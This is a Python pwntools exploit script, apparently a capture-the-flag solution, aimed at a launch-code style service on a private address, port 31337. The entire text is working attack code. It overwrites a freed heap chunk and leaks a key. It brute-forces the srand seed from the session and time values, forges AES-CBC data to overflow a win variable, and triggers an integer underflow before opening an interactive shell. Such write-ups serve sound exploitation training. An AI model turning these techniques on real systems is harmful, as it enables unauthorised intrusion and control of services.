from pwn import *
import ctypes
from Crypto.Cipher import AES

r = remote("172.16.37.128", 31337)

r.recvuntil("LAUNCH SESSION ")
session = int(r.recvn(26)[16:])

# overwrite freed chunk

r.sendline("3")
r.send("\n\n")

r.sendline("2")
r.sendline("41" * 16)
r.sendline("32")
r.sendafter("ENTER DATA TO ENCRYPT: ", "A" * 32)
r.send("\n")

# leak key2

r.sendline("3")
r.recvuntil("CHALLENGE (64 Bytes):\n")

challenge = ""
for i in range(4):
    challenge += (r.recvline()[-48:-1]).replace(".", "") 

challenge = [challenge[byte:byte+2] for byte in range(0, len(challenge), 2)] 
challenge = "".join([chr(int(element, 16)) for element in challenge])

r.recvuntil("TIME NOW: ")
time_now = int(r.recvline()[7:17])
r.send("\n\n")

# find seed

libc = ctypes.cdll.LoadLibrary("libc.so.6")
first = u32(challenge[0:4])
first = first ^ 0x41414141

for seed in range(session + time_now - 60, session + time_now + 1):
    libc.srand(seed & 0xFFFFFFFF)
    rando = libc.rand()

    if first == rando:
        break
    elif seed == session + time_now:
        exit()

# calculate key2 and overflowing in win variable of key3

libc.srand(seed & 0xFFFFFFFF)
[libc.rand() for i in range(12)]

key2 = ''.join([p32(u32(challenge[i:i+4]) ^ libc.rand()) for i in range(48, 64, 4)])
IV = ('CFFAEDFEDEC0ADDEFECABEBA0BB0550A').decode('hex')
aes = AES.new(key2, AES.MODE_CBC, IV)
part1 = (aes.encrypt("KING CROWELL" + "\x00" * 4)).encode("hex")
auth_data = (part1 + "371303" + "00" * 13).decode("hex")
part2 = aes.decrypt(auth_data)[16:]

r.sendline("2")
r.sendline(key2.encode("hex"))
r.sendline("32")
r.sendafter("ENTER DATA TO ENCRYPT: ", "KING CROWELL" + "\x00" * 4 + part2)
r.send("\n")

r.sendline("3")
r.send("\n\n")

# key1 integer underflow

r.sendline("1")
r.sendline("\x00")
r.send("\n")

r.interactive()